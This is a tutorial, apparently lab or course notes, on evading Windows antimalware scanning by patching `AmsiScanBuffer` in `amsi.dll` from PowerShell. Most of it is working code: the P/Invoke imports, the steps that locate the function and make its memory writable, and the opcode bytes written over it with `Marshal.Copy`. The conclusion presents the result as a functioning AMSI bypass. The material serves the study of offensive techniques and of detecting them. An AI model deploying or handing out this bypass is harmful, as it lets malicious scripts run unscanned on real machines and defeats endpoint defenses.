# AMSI Patching: Runtime Detection Evasion

AMSI is primarily instrumented and loaded from `amsi.dll`. This can be confirmed from the diagram we observed earlier. This DLL can be abused and forced to point to a response code we want. The `AmsiScanBuffer` function provides the hooks and functionality needed to access the pointer/buffer for the response code.

`AmsiScanBuffer` is vulnerable because `amsi.dll` is loaded into the PowerShell process at startup, and our session has the same permission level as the utility.

`AmsiScanBuffer` scans a "buffer" of suspected code and reports it to `amsi.dll` to determine the response. We can control this function and overwrite the buffer with a clean return code. The buffer needed for the return code has already been identified through prior research and reverse engineering.

We will break down a code snippet modified by BC-Security and inspired by Tal Liberman. RastaMouse also has a similar bypass written in C# using the same technique.

## High-Level AMSI Patching Steps

1. Obtain handle of `amsi.dll`
2. Get process address of `AmsiScanBuffer`
3. Modify memory protections of `AmsiScanBuffer`
4. Write opcodes to `AmsiScanBuffer`

---

## Step 1: Import Required API Functions

We need to load external libraries or API calls using P/Invoke. The following functions are imported from `kernel32.dll`:

```csharp
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(
    IntPtr hModule,
    string procName
);

[DllImport("kernel32")]
public static extern IntPtr GetModuleHandle(
    string lpModuleName
);

[DllImport("kernel32")]
public static extern bool VirtualProtect(
    IntPtr lpAddress,
    UIntPtr dwSize,
    uint flNewProtect,
    out uint lpflOldProtect
);
```

These functions are then loaded using PowerShell's `Add-Type` cmdlet:

```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
```

---

## Step 2: Locate `amsi.dll` and `AmsiScanBuffer`

Identify the process handle of AMSI using `GetModuleHandle`, then use it to get the address of `AmsiScanBuffer`:

```powershell
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll')
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'AmsiScanBuffer')
```

---

## Step 3: Modify Memory Protections

Change the memory protection of the `AmsiScanBuffer` region using `VirtualProtect`:

```powershell
[UInt32]$Size = 0x5         # Size of region
[UInt32]$ProtectFlag = 0x40 # PAGE_EXECUTE_READWRITE
[UInt32]$OldProtectFlag = 0
[Win32.Kernel32]::VirtualProtect(
    $BufferAddress,
    $Size,
    $ProtectFlag,
    [Ref]$OldProtectFlag
)
```

---

## Step 4: Overwrite the Buffer

Specify the buffer to overwrite and use `Marshal.Copy` to write to the process:

```powershell
$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(
    $buf,
    0,
    $BufferAddress,
    6
)
```

---

## Conclusion

At this stage, you should have an AMSI bypass that works. However, note that most tooling can detect this script, as signatures and detections are often crafted for such techniques.